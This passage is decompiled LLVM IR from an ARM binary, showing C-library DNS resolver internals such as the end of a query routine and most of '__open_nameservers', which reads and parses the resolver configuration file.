  %v4_19330 = mul i32 %v6_1982c, 4
  %v5_19330 = add i32 %v4_19330, ptrtoint (i32* @global_var_2ef64.1140 to i32)
  %v6_19330 = inttoptr i32 %v5_19330 to i32*
  br label %dec_label_pc_1924c

dec_label_pc_19878:                               ; preds = %bb195, %.thread8, %dec_label_pc_191a4, %dec_label_pc_19198
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_19884

dec_label_pc_19884:                               ; preds = %dec_label_pc_191b4, %dec_label_pc_19864.backedge, %dec_label_pc_19868.outer.backedge, %dec_label_pc_1933c, %bb200, %dec_label_pc_19868.backedge, %dec_label_pc_19878
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_19878 ], [ %v0_193fc, %dec_label_pc_19868.backedge ], [ %v1_19254, %bb200 ], [ %v1_19254, %dec_label_pc_1933c ], [ %v0_193fc, %dec_label_pc_19868.outer.backedge ], [ -1, %dec_label_pc_191b4 ], [ %v0_193fc, %dec_label_pc_19864.backedge ]
  %v0_19884 = call i32 @__GI___h_errno_location()
  %v2_1988c = inttoptr i32 %v0_19884 to i32*
  store i32 -1, i32* %v2_1988c, align 4
  %v0_19890 = load i32, i32* @sb, align 4
  store i32 %v0_19890, i32* @r6, align 4
  br label %dec_label_pc_19894

dec_label_pc_19894:                               ; preds = %dec_label_pc_19580, %dec_label_pc_19884
  %v1_1989c = phi i32 [ %stack_var_-216.2, %dec_label_pc_19884 ], [ %v0_193fc, %dec_label_pc_19580 ]
  %v7_19898 = icmp eq i32 %v1_1989c, -1
  br i1 %v7_19898, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_19894
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_19894, %bb208
  store i32 104612, i32* @lr, align 4
  %v1_198a0 = xor i1 %v7_19898, true
  call void @__pseudo_cond_branch(i1 %v1_198a0, i32 ptrtoint (i32* @global_var_14054.1133 to i32))
  %v2_198a4 = load i32, i32* %stack_var_-236, align 4
  %v1_198a8 = call i32 @free(i32 %v2_198a4)
  %v0_198ac = load i32, i32* @r7, align 4
  %v1_198b0 = call i32 @free(i32 %v0_198ac)
  %v0_198b4 = load i32, i32* @sl, align 4
  %v7_198b4 = icmp eq i32 %v0_198b4, -1
  br i1 %v7_198b4, label %bb210, label %dec_label_pc_198c0

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_1991c

dec_label_pc_198c0:                               ; preds = %bb209
  %v2_198c0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_198c0, i32* @r0, align 4
  %v1_198d8 = call i32 @__pthread_return_void()
  %v1_198e8 = call i32 @__pthread_return_0()
  %v0_198f4 = load i32, i32* @r6, align 4
  %v3_198f4 = sdiv i32 %v0_198f4, 256
  %v0_198f8 = load i32, i32* @sl, align 4
  store i32 %v0_198f8, i32* @global_var_2eeb4.1128, align 4
  store i32 %v2_198c0, i32* @r0, align 4
  %v1_19904 = trunc i32 %v3_198f4 to i8
  store i8 %v1_19904, i8* @global_var_28c09.1131, align 1
  %v1_19908 = trunc i32 %v0_198f4 to i8
  store i8 %v1_19908, i8* bitcast (i8** @global_var_28c08.1130 to i8*), align 4
  store i32 104728, i32* @lr, align 4
  %v1_19914 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1991c

dec_label_pc_1991c:                               ; preds = %bb210, %bb207, %dec_label_pc_198c0
  %v0_1991c = phi i32 [ %v0_198b4, %bb210 ], [ %v0_1991c.pre, %bb207 ], [ -1, %dec_label_pc_198c0 ]
  store i32 %v3_19150, i32* @r4, align 4
  store i32 %v6_19150, i32* @r5, align 4
  store i32 %v9_19150, i32* @r6, align 4
  store i32 %v12_19150, i32* @r7, align 4
  store i32 %v15_19150, i32* @r8, align 4
  store i32 %v18_19150, i32* @sb, align 4
  store i32 %v21_19150, i32* @sl, align 4
  ret i32 %v0_1991c

; uselistorder directives
  uselistorder i32 %v0_198f4, { 1, 0 }
  uselistorder i32 %v0_198b4, { 1, 0 }
  uselistorder i1 %v7_19898, { 1, 0 }
  uselistorder i32 %v6_1982c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_19770, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_195c4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_196bc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1967c, { 1, 0 }
  uselistorder i32 %v0_1959c, { 1, 0 }
  uselistorder i32 %v0_195a0, { 1, 0 }
  uselistorder i32 %v6_194a0, { 1, 0 }
  uselistorder i32 %v0_193fc, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_19368, { 1, 0 }
  uselistorder i32 %v2_19308, { 1, 0 }
  uselistorder i32 %v1_19280, { 1, 2, 0 }
  uselistorder i1 %v7_19250, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_19254, { 1, 2, 0 }
  uselistorder i32 %v0_19244, { 1, 0 }
  uselistorder i32 %v2_191c8, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @__libc_recv, { 4, 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 10, 5, 6, 0, 1, 2, 3, 4, 7, 8, 9, 11 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 6, 4 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 8, 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 ()* @socket, { 0, 13, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 12 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_28c09.1131, { 2, 1, 0 }
  uselistorder i32 512, { 3, 4, 2, 5, 1, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_1991c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_19894, { 1, 0 }
  uselistorder label %dec_label_pc_19884, { 6, 1, 2, 5, 3, 4, 0 }
  uselistorder label %dec_label_pc_19878, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1924c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19864.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_197cc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_19868.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19798, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_19718, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_19704, { 1, 0 }
  uselistorder label %dec_label_pc_196f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_196ec, { 1, 0 }
  uselistorder label %dec_label_pc_19654, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19590, { 1, 0 }
  uselistorder label %dec_label_pc_19580, { 1, 0 }
  uselistorder label %dec_label_pc_19868.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_193e8, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_1933c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_19928:
  %v0_19928 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19928, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19928
  %v5_19928 = mul i32 %arg2, 256
  %v6_19928 = and i32 %v5_19928, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19928, %bb
  %v10_19958 = phi i32 [ %arg1, %dec_label_pc_19928 ], [ %v6_19928, %bb ]
  ret i32 %v10_19958

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1995c = load i32, i32* @r4, align 4
  store i32 %v3_1995c, i32* %stack_var_-28, align 4
  %v6_1995c = load i32, i32* @r5, align 4
  %v9_1995c = load i32, i32* @r6, align 4
  %v12_1995c = load i32, i32* @r7, align 4
  %v15_1995c = load i32, i32* @r8, align 4
  %v18_1995c = load i32, i32* @sl, align 4
  %v2_19960 = ptrtoint i32* %stack_var_-192 to i32
  %v2_19964 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_19964, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_28c0c.973 to i32), i32* %r2.global-to-local, align 4
  %v1_19978 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_28c0c.973 to i32), i32* %r0.global-to-local, align 4
  store i32 104844, i32* @lr, align 4
  %v1_19988 = call i32 @__pthread_return_0()
  store i32 %v1_19988, i32* %r0.global-to-local, align 4
  %v2_19990 = load i32, i32* @global_var_2ef80.978, align 4
  %v5_19998 = icmp sgt i32 %v2_19990, 0
  br i1 %v5_19998, label %dec_label_pc_19bd4, label %dec_label_pc_1999c

dec_label_pc_1999c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_2067c.1150 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_20690.1152 to i32), i32* @r1, align 4
  %v3_199a4 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_2067c.1150 to i32), i32 ptrtoint (i32* @global_var_20690.1152 to i32))
  store i32 %v3_199a4, i32* %r0.global-to-local, align 4
  store i32 %v3_199a4, i32* @sl, align 4
  %v2_199a8 = icmp eq i32 %v3_199a4, 0
  br i1 %v2_199a8, label %dec_label_pc_199b0, label %dec_label_pc_19b9c.preheader

dec_label_pc_199b0:                               ; preds = %dec_label_pc_1999c
  store i32 ptrtoint ([24 x i8]* @global_var_20694.1154 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_20690.1152 to i32), i32* @r1, align 4
  %v3_199b8 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_20694.1154 to i32), i32 ptrtoint (i32* @global_var_20690.1152 to i32))
  store i32 %v3_199b8, i32* %r0.global-to-local, align 4
  store i32 %v3_199b8, i32* @sl, align 4
  %v2_199bc = icmp eq i32 %v3_199b8, 0
  br i1 %v2_199bc, label %dec_label_pc_19bc8, label %dec_label_pc_19b9c.preheader

dec_label_pc_19b9c.preheader:                     ; preds = %dec_label_pc_1999c, %dec_label_pc_199b0
  %v0_19ba426 = phi i32 [ %v3_199a4, %dec_label_pc_1999c ], [ %v3_199b8, %dec_label_pc_199b0 ]
  %v2_19a10 = ptrtoint i32* %stack_var_-28 to i32
  %v3_19aac = inttoptr i32 %tmp to i8*
  store i32 %v2_19960, i32* %r0.global-to-local, align 4
  store i32 %v0_19ba426, i32* %r2.global-to-local, align 4
  %v3_19ba866 = call i32 @fgets(i32 %v2_19960, i32 128, i32 %v0_19ba426)
  store i32 %v3_19ba866, i32* %r0.global-to-local, align 4
  %v2_19bac68 = icmp eq i32 %v3_19ba866, 0
  store i32 %v2_19960, i32* @r4, align 4
  br i1 %v2_19bac68, label %dec_label_pc_19bbc, label %dec_label_pc_199cc.preheader.lr.ph

dec_label_pc_199cc.preheader.lr.ph:               ; preds = %dec_label_pc_19b9c.preheader
  %v1_199cc11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_199cc.preheader

dec_label_pc_199c8:                               ; preds = %dec_label_pc_199d8
  %v1_199c8 = add i32 %v0_199c8, 1
  store i32 %v1_199c8, i32* %r0.global-to-local, align 4
  %v1_199cc = inttoptr i32 %v1_199c8 to i8*
  %v2_199cc = load i8, i8* %v1_199cc, align 1
  %v3_199cc = zext i8 %v2_199cc to i32
  store i32 %v3_199cc, i32* %r2.global-to-local, align 4
  %v2_199d0 = icmp eq i8 %v2_199cc, 0
  br i1 %v2_199d0, label %dec_label_pc_199ec, label %dec_label_pc_199d8

dec_label_pc_199d8:                               ; preds = %dec_label_pc_199d8.lr.ph, %dec_label_pc_199c8
  %v0_199c8 = phi i32 [ %v2_19960, %dec_label_pc_199d8.lr.ph ], [ %v1_199c8, %dec_label_pc_199c8 ]
  %v1_199e0 = phi i32 [ %v3_199cc13, %dec_label_pc_199d8.lr.ph ], [ %v3_199cc, %dec_label_pc_199c8 ]
  %v3_199e0 = mul nuw nsw i32 %v1_199e0, 2
  %v4_199e0 = add i32 %v3_199e0, %v2_199dc.pre
  %v5_199e0 = inttoptr i32 %v4_199e0 to i8*
  %v6_199e0 = load i8, i8* %v5_199e0, align 1
  %v1_199e4 = and i8 %v6_199e0, 32
  %v2_199e4 = icmp eq i8 %v1_199e4, 0
  br i1 %v2_199e4, label %dec_label_pc_199ec, label %dec_label_pc_199c8

dec_label_pc_199ec:                               ; preds = %dec_label_pc_199c8, %dec_label_pc_199d8, %dec_label_pc_199cc.preheader
  %v0_19a8435 = phi i32 [ %v2_19960, %dec_label_pc_199cc.preheader ], [ %v1_199c8, %dec_label_pc_199c8 ], [ %v0_199c8, %dec_label_pc_199d8 ]
  %v0_19a00 = phi i32 [ %v3_199cc13, %dec_label_pc_199cc.preheader ], [ %v3_199cc, %dec_label_pc_199c8 ], [ %v1_199e0, %dec_label_pc_199d8 ]
  %v7_199ec = icmp eq i32 %v0_19a00, 10
  br i1 %v7_199ec, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_199ec
  %v3_199f0 = icmp eq i32 %v0_19a00, 0
  br i1 %v3_199f0, label %bb55, label %dec_label_pc_19a00

.thread3:                                         ; preds = %dec_label_pc_199ec
  br label %dec_label_pc_19b9c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_19b9c.backedge

dec_label_pc_19b9c.backedge:                      ; preds = %dec_label_pc_19b78, %dec_label_pc_19b90, %bb55, %dec_label_pc_19b10, %.thread3, %dec_label_pc_19a00
  %v0_19ba4.pre = load i32, i32* @sl, align 4
  store i32 %v2_19960, i32* %r0.global-to-local, align 4
  store i32 %v0_19ba4.pre, i32* %r2.global-to-local, align 4
  %v3_19ba8 = call i32 @fgets(i32 %v2_19960, i32 128, i32 %v0_19ba4.pre)
  store i32 %v3_19ba8, i32* %r0.global-to-local, align 4
  %v2_19bac = icmp eq i32 %v3_19ba8, 0
  store i32 %v2_19960, i32* @r4, align 4
  br i1 %v2_19bac, label %dec_label_pc_19bbc, label %dec_label_pc_199cc.preheader

dec_label_pc_19a00:                               ; preds = %bb
  %v7_19a00 = icmp eq i32 %v0_19a00, 35
  br i1 %v7_19a00, label %dec_label_pc_19b9c.backedge, label %dec_label_pc_19a84

dec_label_pc_19a10:                               ; preds = %bb58
  store i32 %v2_19a10, i32* %r2.global-to-local, align 4
  %v4_19a14 = mul i32 %storemerge, 4
  %v5_19a14 = add i32 %v4_19a14, %v2_19a10
  %v2_19a18 = add i32 %v5_19a14, -36
  %v3_19a18 = inttoptr i32 %v2_19a18 to i32*
  store i32 %v0_19a18, i32* %v3_19a18, align 4
  %v0_19a2415 = load i32, i32* %r0.global-to-local, align 4
  %v1_19a2416 = inttoptr i32 %v0_19a2415 to i8*
  %v2_19a2417 = load i8, i8* %v1_19a2416, align 1
  %v3_19a2418 = zext i8 %v2_19a2417 to i32
  store i32 %v3_19a2418, i32* %r2.global-to-local, align 4
  %v2_19a2819 = icmp eq i8 %v2_19a2417, 0
  br i1 %v2_19a2819, label %dec_label_pc_19a58.preheader, label %dec_label_pc_19a30.lr.ph

dec_label_pc_19a30.lr.ph:                         ; preds = %dec_label_pc_19a10
  %v2_19a34.pre = load i32, i32* @global_var_288c8, align 4
  br label %dec_label_pc_19a30

dec_label_pc_19a20:                               ; preds = %dec_label_pc_19a44
  %v1_19a20 = add i32 %v0_19a20, 1
  store i32 %v1_19a20, i32* %r0.global-to-local, align 4
  %v1_19a24 = inttoptr i32 %v1_19a20 to i8*
  %v2_19a24 = load i8, i8* %v1_19a24, align 1
  %v3_19a24 = zext i8 %v2_19a24 to i32
  store i32 %v3_19a24, i32* %r2.global-to-local, align 4
  %v2_19a28 = icmp eq i8 %v2_19a24, 0
  br i1 %v2_19a28, label %dec_label_pc_19a58.preheader, label %dec_label_pc_19a30

dec_label_pc_19a30:                               ; preds = %dec_label_pc_19a30.lr.ph, %dec_label_pc_19a20
  %v0_19a20 = phi i32 [ %v0_19a2415, %dec_label_pc_19a30.lr.ph ], [ %v1_19a20, %dec_label_pc_19a20 ]
  %v0_19a44 = phi i32 [ %v3_19a2418, %dec_label_pc_19a30.lr.ph ], [ %v3_19a24, %dec_label_pc_19a20 ]
  %v3_19a38 = mul nuw nsw i32 %v0_19a44, 2
  %v4_19a38 = add i32 %v3_19a38, %v2_19a34.pre
  %v5_19a38 = inttoptr i32 %v4_19a38 to i8*
  %v6_19a38 = load i8, i8* %v5_19a38, align 1
  %v1_19a3c = and i8 %v6_19a38, 32
  %v2_19a3c = icmp eq i8 %v1_19a3c, 0
  br i1 %v2_19a3c, label %dec_label_pc_19a44, label %dec_label_pc_19a58.preheader

dec_label_pc_19a44:                               ; preds = %dec_label_pc_19a30
  %v7_19a44 = icmp eq i32 %v0_19a44, 10
  br i1 %v7_19a44, label %dec_label_pc_19a58.preheader, label %dec_label_pc_19a20

dec_label_pc_19a58.preheader:                     ; preds = %dec_label_pc_19a44, %dec_label_pc_19a30, %dec_label_pc_19a20, %dec_label_pc_19a10
  %v0_19a5820 = phi i32 [ %v0_19a2415, %dec_label_pc_19a10 ], [ %v0_19a20, %dec_label_pc_19a44 ], [ %v0_19a20, %dec_label_pc_19a30 ], [ %v1_19a20, %dec_label_pc_19a20 ]
  %v1_19a5821 = inttoptr i32 %v0_19a5820 to i8*
  %v2_19a5822 = load i8, i8* %v1_19a5821, align 1
  %v3_19a5823 = zext i8 %v2_19a5822 to i32
  store i32 %v3_19a5823, i32* %r2.global-to-local, align 4
  %v2_19a5c24 = icmp eq i8 %v2_19a5822, 0
  br i1 %v2_19a5c24, label %dec_label_pc_19a80, label %dec_label_pc_19a64

dec_label_pc_19a50:                               ; preds = %dec_label_pc_19a64, %dec_label_pc_19a78
  %v3_19a54 = inttoptr i32 %v2_19a54 to i8*
  store i8 0, i8* %v3_19a54, align 1
  %v4_19a54 = load i32, i32* %r0.global-to-local, align 4
  %v5_19a54 = add i32 %v4_19a54, 1
  store i32 %v5_19a54, i32* %r0.global-to-local, align 4
  %v1_19a58 = inttoptr i32 %v5_19a54 to i8*
  %v2_19a58 = load i8, i8* %v1_19a58, align 1
  %v3_19a58 = zext i8 %v2_19a58 to i32
  store i32 %v3_19a58, i32* %r2.global-to-local, align 4
  %v2_19a5c = icmp eq i8 %v2_19a58, 0
  br i1 %v2_19a5c, label %dec_label_pc_19a80, label %dec_label_pc_19a64

dec_label_pc_19a64:                               ; preds = %dec_label_pc_19a58.preheader, %dec_label_pc_19a50
  %v0_19a78 = phi i32 [ %v3_19a58, %dec_label_pc_19a50 ], [ %v3_19a5823, %dec_label_pc_19a58.preheader ]
  %v2_19a54 = phi i32 [ %v5_19a54, %dec_label_pc_19a50 ], [ %v0_19a5820, %dec_label_pc_19a58.preheader ]
  %v2_19a68 = load i32, i32* @global_var_288c8, align 4
  %v3_19a6c = mul nuw nsw i32 %v0_19a78, 2
  %v4_19a6c = add i32 %v2_19a68, %v3_19a6c
  %v5_19a6c = inttoptr i32 %v4_19a6c to i8*
  %v6_19a6c = load i8, i8* %v5_19a6c, align 1
  %v1_19a70 = and i8 %v6_19a6c, 32
  %v2_19a70 = icmp eq i8 %v1_19a70, 0
  br i1 %v2_19a70, label %dec_label_pc_19a78, label %dec_label_pc_19a50

dec_label_pc_19a78:                               ; preds = %dec_label_pc_19a64
  %v7_19a78 = icmp eq i32 %v0_19a78, 10
  br i1 %v7_19a78, label %dec_label_pc_19a50, label %dec_label_pc_19a80

dec_label_pc_19a80:                               ; preds = %dec_label_pc_19a50, %dec_label_pc_19a78, %dec_label_pc_19a58.preheader
  %v0_19a8434 = phi i32 [ %v0_19a5820, %dec_label_pc_19a58.preheader ], [ %v5_19a54, %dec_label_pc_19a50 ], [ %v2_19a54, %dec_label_pc_19a78 ]
  %v0_19a80 = load i32, i32* @r8, align 4
  %v1_19a80 = add i32 %v0_19a80, 1
  br label %dec_label_pc_19a84

dec_label_pc_19a84:                               ; preds = %dec_label_pc_19a00, %dec_label_pc_19a80
  %storemerge = phi i32 [ %v1_19a80, %dec_label_pc_19a80 ], [ 0, %dec_label_pc_19a00 ]
  %v0_19a18 = phi i32 [ %v0_19a8434, %dec_label_pc_19a80 ], [ %v0_19a8435, %dec_label_pc_19a00 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_19a84 = inttoptr i32 %v0_19a18 to i8*
  %v2_19a84 = load i8, i8* %v1_19a84, align 1
  %v3_19a84 = zext i8 %v2_19a84 to i32
  %v2_19a88 = icmp eq i8 %v2_19a84, 0
  br i1 %v2_19a88, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_19a84
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_19a84, %bb56
  %v0_19a98.pr = phi i32 [ %v3_19a84, %dec_label_pc_19a84 ], [ 1, %bb56 ]
  %v1_19a90 = add i32 %storemerge, -4
  %v3_19a90 = sub i32 3, %storemerge
  %v4_19a90 = and i32 %v3_19a90, %storemerge
  %v5_19a90 = icmp slt i32 %v4_19a90, 0
  %v6_19a90 = icmp slt i32 %v1_19a90, 0
  %v7_19a90 = icmp eq i32 %storemerge, 4
  %v3_19a94 = xor i1 %v6_19a90, %v5_19a90
  %v4_19a94 = or i1 %v7_19a90, %v3_19a94
  br i1 %v4_19a94, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_19aa0

bb58:                                             ; preds = %bb57
  %v2_19a98 = icmp eq i32 %v0_19a98.pr, 0
  br i1 %v2_19a98, label %dec_label_pc_19aa0, label %dec_label_pc_19a10

dec_label_pc_19aa0:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_206ac.1157 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_19aac = call i32 @__GI_strcoll(i8* %v3_19aac, i32 ptrtoint ([11 x i8]* @global_var_206ac.1157 to i32))
  store i32 %v4_19aac, i32* %r0.global-to-local, align 4
  %v2_19ab0 = icmp eq i32 %v4_19aac, 0
  br i1 %v2_19ab0, label %dec_label_pc_19ad8.preheader, label %dec_label_pc_19afc

dec_label_pc_19ad8.preheader:                     ; preds = %dec_label_pc_19aa0
  br label %dec_label_pc_19ad8

dec_label_pc_19ac0:                               ; preds = %dec_label_pc_19af0
  %v1_19ac0 = add i32 %v5_19ae0, -36
  %v2_19ac0 = inttoptr i32 %v1_19ac0 to i32*
  %v3_19ac0 = load i32, i32* %v2_19ac0, align 4
  store i32 %v3_19ac0, i32* %r0.global-to-local, align 4
  %v1_19ac4 = inttoptr i32 %v3_19ac0 to i8*
  %v2_19ac4 = call i32 @__GI_strdup(i8* %v1_19ac4)
  store i32 %v2_19ac4, i32* %r0.global-to-local, align 4
  %v0_19acc = load i32, i32* @r4, align 4
  %v1_19acc = add i32 %v0_19acc, 1
  store i32 %v1_19acc, i32* %r2.global-to-local, align 4
  %v5_19ad0 = mul i32 %v0_19acc, 4
  %v6_19ad0 = add i32 %v5_19ad0, ptrtoint (i32* @global_var_2ef74.981 to i32)
  %v7_19ad0 = inttoptr i32 %v6_19ad0 to i32*
  store i32 %v2_19ac4, i32* %v7_19ad0, align 4
  %v0_19ad4 = load i32, i32* %r2.global-to-local, align 4
  %v1_19ad4 = load i32, i32* @r7, align 4
  %v2_19ad4 = inttoptr i32 %v1_19ad4 to i32*
  store i32 %v0_19ad4, i32* %v2_19ad4, align 4
  %v0_19adc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19ad8

dec_label_pc_19ad8:                               ; preds = %dec_label_pc_19ad8.preheader, %dec_label_pc_19ac0
  %v0_19ae8 = phi i32 [ 1, %dec_label_pc_19ad8.preheader ], [ %v0_19adc.pre, %dec_label_pc_19ac0 ]
  store i32 %v2_19a10, i32* %r2.global-to-local, align 4
  %v1_19adc = load i32, i32* @r8, align 4
  %v2_19adc = sub i32 %v0_19ae8, %v1_19adc
  %v4_19adc = xor i32 %v1_19adc, %v0_19ae8
  %v5_19adc = xor i32 %v2_19adc, %v0_19ae8
  %v6_19adc = and i32 %v5_19adc, %v4_19adc
  %v7_19adc = icmp slt i32 %v6_19adc, 0
  %v8_19adc = icmp slt i32 %v2_19adc, 0
  %v4_19ae0 = mul i32 %v0_19ae8, 4
  %v5_19ae0 = add i32 %v4_19ae0, %v2_19a10
  store i32 ptrtoint (i32* @global_var_2ef80.978 to i32), i32* @r7, align 4
  %v1_19ae8 = add i32 %v0_19ae8, 1
  store i32 %v1_19ae8, i32* @r5, align 4
  %v2_19aec = xor i1 %v8_19adc, %v7_19adc
  br i1 %v2_19aec, label %dec_label_pc_19af0, label %dec_label_pc_19afc

dec_label_pc_19af0:                               ; preds = %dec_label_pc_19ad8
  %v2_19af0 = load i32, i32* @global_var_2ef80.978, align 4
  store i32 %v2_19af0, i32* @r4, align 4
  %v7_19af8 = icmp slt i32 %v2_19af0, 3
  br i1 %v7_19af8, label %dec_label_pc_19ac0, label %dec_label_pc_19afc

dec_label_pc_19afc:                               ; preds = %dec_label_pc_19ad8, %dec_label_pc_19af0, %dec_label_pc_19aa0
  %v0_19afc = load i32, i32* @r6, align 4
  store i32 %v0_19afc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_206b8.1160 to i32), i32* @r1, align 4
  %v3_19b04 = inttoptr i32 %v0_19afc to i8*
  %v4_19b04 = call i32 @__GI_strcoll(i8* %v3_19b04, i32 ptrtoint ([7 x i8]* @global_var_206b8.1160 to i32))
  store i32 %v4_19b04, i32* %r0.global-to-local, align 4
  %v2_19b08 = icmp eq i32 %v4_19b04, 0
  br i1 %v2_19b08, label %dec_label_pc_19b40.preheader, label %dec_label_pc_19b10

dec_label_pc_19b10:                               ; preds = %dec_label_pc_19afc
  %v0_19b10 = load i32, i32* @r6, align 4
  store i32 %v0_19b10, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_206c0.1162 to i32), i32* @r1, align 4
  %v3_19b18 = inttoptr i32 %v0_19b10 to i8*
  %v4_19b18 = call i32 @__GI_strcoll(i8* %v3_19b18, i32 ptrtoint ([7 x i8]* @global_var_206c0.1162 to i32))
  store i32 %v4_19b18, i32* %r0.global-to-local, align 4
  %v2_19b1c = icmp eq i32 %v4_19b18, 0
  br i1 %v2_19b1c, label %dec_label_pc_19b40.preheader, label %dec_label_pc_19b9c.backedge

dec_label_pc_19b40.preheader:                     ; preds = %dec_label_pc_19afc, %dec_label_pc_19b10
  store i32 ptrtoint (i32* @global_var_2ef84.1136 to i32), i32* @r4, align 4
  %v2_19b4460 = load i32, i32* @global_var_2ef84.1136, align 4
  store i32 ptrtoint (i32* @global_var_2ef64.1140 to i32), i32* @r5, align 4
  %v1_19b5063 = add i32 %v2_19b4460, -1
  store i32 %v1_19b5063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_19b4460, 1
  br i1 %tmp5964, label %dec_label_pc_19b58, label %dec_label_pc_19b28

dec_label_pc_19b28:                               ; preds = %dec_label_pc_19b40.preheader, %dec_label_pc_19b28
  %v1_19b5065 = phi i32 [ %v1_19b50, %dec_label_pc_19b28 ], [ %v1_19b5063, %dec_label_pc_19b40.preheader ]
  %v4_19b28 = mul i32 %v1_19b5065, 4
  %v5_19b28 = add i32 %v4_19b28, ptrtoint (i32* @global_var_2ef64.1140 to i32)
  %v6_19b28 = inttoptr i32 %v5_19b28 to i32*
  %v7_19b28 = load i32, i32* %v6_19b28, align 4
  store i32 %v7_19b28, i32* %r0.global-to-local, align 4
  store i32 %v1_19b5065, i32* @global_var_2ef84.1136, align 4
  %v1_19b30 = call i32 @free(i32 %v7_19b28)
  store i32 %v1_19b30, i32* %r0.global-to-local, align 4
  %v0_19b34 = load i32, i32* @r4, align 4
  %v1_19b34 = inttoptr i32 %v0_19b34 to i32*
  %v2_19b34 = load i32, i32* %v1_19b34, align 4
  %v1_19b3c = load i32, i32* @r5, align 4
  %v5_19b3c = mul i32 %v2_19b34, 4
  %v6_19b3c = add i32 %v1_19b3c, %v5_19b3c
